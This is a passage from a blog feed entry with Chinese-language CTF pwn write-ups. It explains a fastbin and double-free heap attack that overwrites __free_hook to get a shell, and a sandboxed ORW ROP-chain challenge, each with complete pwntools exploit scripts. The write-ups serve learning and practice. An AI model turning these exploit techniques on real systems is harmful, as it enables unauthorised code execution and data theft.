punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span></code></pre><p>接下来还要想办法更靠近一点，那就继续fastbin attack，我们只需要伪造fakechunk即可</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>康康这样构造之后会变成什么样<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/39.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/40.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/41.jpg" alt=""><br>main_arena+48对应着的是fastbin中0x70大小的chunk的地址，这样我们再add一个就能将chunk分配到main_arena+16处<br>然后就是将topchunk的地址给覆盖掉，覆盖到哪，__free_hook-0xb58处是一个可以接受的地址，作为topchunk大小也足够<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/42.jpg" alt=""></p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/43.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/44.jpg" alt=""><br>覆盖成功<br>最后就是连续分配了，考虑到0xb85/0xa0=18…0x18,我们连续分配18个0x90大小的chunk，第十九次分配就能分配到free_hook附近，然后就能修改free_hook的值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></code></pre><p>以下是完整exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'delete: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h2><p>考察点:tcache表头攻击<br>简略说一下吧，tcache结构体存在于heap区域，tcache到tcache+0x50处是各个tcache的大小，剩下的区域中存储着各个tcache的地址，<br>程序存在dobule free，那么我们就可以通过double free泄露heap地址，进而知道tcache地址，然后修改响应大小的tcache指向的地址，就可以任意地址写了<br>之后的攻击就是正常的利用one_gadget分配到malloc_hook上，即可getshell</p><h2 id="V-amp-N2020-公开赛-warmup"><a href="#V-amp-N2020-公开赛-warmup" class="headerlink" title="[V&amp;N2020 公开赛]warmup"></a>[V&amp;N2020 公开赛]warmup</h2><p>考察点：orw攻击和对栈空间的理解<br>同样简略说一下，程序开启了沙箱，禁用了exceve和system，这样我们就无法getshell，只能通过orw攻击读取flag<br>而这个程序的main函数又是个套娃<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/45.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/46.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/47.jpg" alt=""><br>第一次输入无溢出，第二次输入存在0x10字节的溢出，刚好溢出到rip，而这个函数的栈帧是位于前一个函数上方的，我们只需在rip处<br>用ret语句连接两个栈帧即可执行第一次读入的内容，我们的攻击思路就是，在第一次输入中输入orw的rop链(由于程序开启了PIE，所以我们使用libc中的gadget)，第二次直接溢出到rip，使用ret连接两个栈桢即可</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./vn_pwn_warmup')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25013</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x21102</span>pop_rsi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x202e8</span>pop_rdx_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x01b92</span>ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x937</span>read_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>open_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c6500</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/flag\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h2&gt;&lt;p&gt;考察点:unsortedbin attack,house of sprit,global_max_fast,fastbin attack&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://lawliet.ren/tags/pwn/"/>
    
  </entry>
  
</feed>
